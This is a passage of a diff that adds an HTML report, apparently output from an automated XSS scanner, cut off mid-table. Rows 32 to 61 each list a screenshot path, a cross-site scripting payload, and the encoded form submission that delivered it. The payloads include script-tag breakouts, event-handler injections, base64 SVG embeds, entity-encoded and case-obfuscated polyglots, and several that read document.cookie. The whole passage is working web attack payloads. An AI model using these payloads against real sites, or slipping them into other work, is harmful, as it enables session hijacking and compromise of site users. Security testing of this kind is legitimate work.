+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>32</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_3_459.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;&lt;SCRIPT>alert(&quot;XSS&quot;);//\&lt;&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%5C%3C%3C%2FSCRIPT%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%5C%3C%3C%2FSCRIPT%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>33</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_4_170.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onload=alert(&#39;XSS&#39;)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>34</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_4_230.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/script>&lt;script>alert(&#39;XSS&#39;);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>35</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_5_530.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=&quot;(function(x){this[x+`ert`](1)})`al`&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%2Fonerror%3D%22%28function%28x%29%7Bthis%5Bx%2B%60ert%60%5D%281%29%7D%29%60al%60%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%2Fonerror%3D%22%28function%28x%29%7Bthis%5Bx%2B%60ert%60%5D%281%29%7D%29%60al%60%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>36</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_5_642.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe/onload=&quot;var b = &#39;document.domain)&#39;; var a = &#39;JaV&#39; + &#39;ascRipt:al&#39; + &#39;ert(&#39; + b; this[&#39;src&#39;]=a&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Ciframe%2Fonload%3D%22var+b+%3D+%27document.domain%29%27%3B+var+a+%3D+%27JaV%27+%2B+%27ascRipt%3Aal%27+%2B+%27ert%28%27+%2B+b%3B+this%5B%27src%27%5D%3Da%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Ciframe%2Fonload%3D%22var+b+%3D+%27document.domain%29%27%3B+var+a+%3D+%27JaV%27+%2B+%27ascRipt%3Aal%27+%2B+%27ert%28%27+%2B+b%3B+this%5B%27src%27%5D%3Da%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>37</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_5_716.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;&quot;>&lt;details/open/ontoggle=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;/xss-by-tarun/&amp;rpar;&quot;>XXXXX&lt;/a></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3C%22%3E%3Cdetails%2Fopen%2Fontoggle%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B%2Fxss-by-tarun%2F%26rpar%3B%22%3EXXXXX%3C%2Fa%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3C%22%3E%3Cdetails%2Fopen%2Fontoggle%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B%2Fxss-by-tarun%2F%26rpar%3B%22%3EXXXXX%3C%2Fa%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>38</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_7_92.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onload=&#39;+/&quot;`/+/onmouseover=1/+/[*/[]/+alert(42);//&#39;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Csvg%2Fonload%3D%27%2B%2F%22%60%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%2842%29%3B%2F%2F%27%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Csvg%2Fonload%3D%27%2B%2F%22%60%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%2842%29%3B%2F%2F%27%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>39</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_7_750.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg+src%3Dx+onerror%3D%22%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%22%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg+src%3Dx+onerror%3D%22%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%22%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>40</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_8_338.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script>alert(1)&lt;/script>&lt;&quot;</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%22&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%22&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>41</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_8_369.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe src=&quot;javascript:alert(&#39;XSS&#39;)&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Ciframe+src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Ciframe+src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>42</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_8_436.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=a onerror=&quot;window[&#39;alert&#39;](document.cookie)&quot;/></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3Da+onerror%3D%22window%5B%27alert%27%5D%28document.cookie%29%22%2F%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3Da+onerror%3D%22window%5B%27alert%27%5D%28document.cookie%29%22%2F%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>43</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_67.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>?query=&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Fquery%3D%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Fquery%3D%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>44</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_54.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(&#39;\u0031&#39;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cscript%3Ealert%28%27%5Cu0031%27%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cscript%3Ealert%28%27%5Cu0031%27%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>45</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_106.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>?query=&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Fquery%3D%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Fquery%3D%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>46</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_146.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>search?q=&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=search%3Fq%3D%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=search%3Fq%3D%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>47</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_180.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>en-us/Search#/?search=&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=en-us%2FSearch%23%2F%3Fsearch%3D%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=en-us%2FSearch%23%2F%3Fsearch%3D%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>48</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_202.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;audio src=&quot;nonexistent.mp3&quot; onerror=&quot;alert(1)&quot;>&lt;/audio></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Caudio+src%3D%22nonexistent.mp3%22+onerror%3D%22alert%281%29%22%3E%3C%2Faudio%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Caudio+src%3D%22nonexistent.mp3%22+onerror%3D%22alert%281%29%22%3E%3C%2Faudio%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>49</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_742.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>guest/msft_a_guest_register.php?_browser=1&amp;title=&quot;>&lt;svg/onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=guest%2Fmsft_a_guest_register.php%3F_browser%3D1%26title%3D%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=guest%2Fmsft_a_guest_register.php%3F_browser%3D1%26title%3D%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>50</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_783.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>Search/Results?q=&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=Search%2FResults%3Fq%3D%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=Search%2FResults%3Fq%3D%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>51</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_9_891.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>Search/Results?q=&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=Search%2FResults%3Fq%3D%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=Search%2FResults%3Fq%3D%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>52</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_10_453.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script akdk> prompt(document.domain)&lt;/script akdk></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Cscript+akdk%3E+prompt%28document.domain%29%3C%2Fscript+akdk%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Cscript+akdk%3E+prompt%28document.domain%29%3C%2Fscript+akdk%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>53</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_10_639.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;details open ontoggle=&quot;alert(1)&quot;>&lt;summary>Click me!&lt;/summary>&lt;/details></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cdetails+open+ontoggle%3D%22alert%281%29%22%3E%3Csummary%3EClick+me%21%3C%2Fsummary%3E%3C%2Fdetails%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cdetails+open+ontoggle%3D%22alert%281%29%22%3E%3Csummary%3EClick+me%21%3C%2Fsummary%3E%3C%2Fdetails%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>54</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_10_659.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe srcdoc=&quot;&lt;script>alert(1)&lt;/script>&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>55</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_11_209.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>xxxxxxxxx&#39;});}); &lt;/script>&lt;script>prompt (&quot;PLEASE%20\nSUBSCRIBE&quot;) &lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=xxxxxxxxx%27%7D%29%3B%7D%29%3B+%3C%2Fscript%3E%3Cscript%3Eprompt+%28%22PLEASE%2520%5CnSUBSCRIBE%22%29+%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=xxxxxxxxx%27%7D%29%3B%7D%29%3B+%3C%2Fscript%3E%3Cscript%3Eprompt+%28%22PLEASE%2520%5CnSUBSCRIBE%22%29+%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>56</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_11_297.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;Img Src=OnXSS OnError=confirm(document.cookie)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3CImg+Src%3DOnXSS+OnError%3Dconfirm%28document.cookie%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3CImg+Src%3DOnXSS+OnError%3Dconfirm%28document.cookie%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>57</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_11_279.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>xxxxxxxxx&#39;});});&lt;/script>&lt;script>prompt(&quot;PLEASE%20\nSUBSCRIBE&quot;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=xxxxxxxxx%27%7D%29%3B%7D%29%3B%3C%2Fscript%3E%3Cscript%3Eprompt%28%22PLEASE%2520%5CnSUBSCRIBE%22%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=xxxxxxxxx%27%7D%29%3B%7D%29%3B%3C%2Fscript%3E%3Cscript%3Eprompt%28%22PLEASE%2520%5CnSUBSCRIBE%22%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>58</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_11_371.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#jaVasCript:/*-/*/*\/*&#39;/*\&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\\x3csVg/&lt;sVg/oNloAd=alert()//>\\x3e</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23jaVasCript%3A%2F%2A-%2F%2A%2F%2A%5C%2F%2A%27%2F%2A%5C%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5C%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5C%5Cx3e&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23jaVasCript%3A%2F%2A-%2F%2A%2F%2A%5C%2F%2A%27%2F%2A%5C%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5C%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5C%5Cx3e&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>59</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_11_919.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:/*-->&lt;/title>&lt;/style>&lt;/textarea>&lt;/script>&lt;/xmp>&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D%27%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%281%29%2F%2F%27%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D%27%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%281%29%2F%2F%27%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>60</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_11_996.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#jaVasCript:/*-/*`/*\\`/*&#39;/*\&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\\x3csVg/&lt;sVg/oNloAd=alert()//>\\x3e</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%5C%60%2F%2A%27%2F%2A%5C%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5C%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5C%5Cx3e&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%5C%60%2F%2A%27%2F%2A%5C%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5C%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5C%5Cx3e&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>61</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_12_19.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript:/*-->&lt;/title>&lt;/style>&lt;/textarea>&lt;/script>&lt;/xmp>&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;</td>
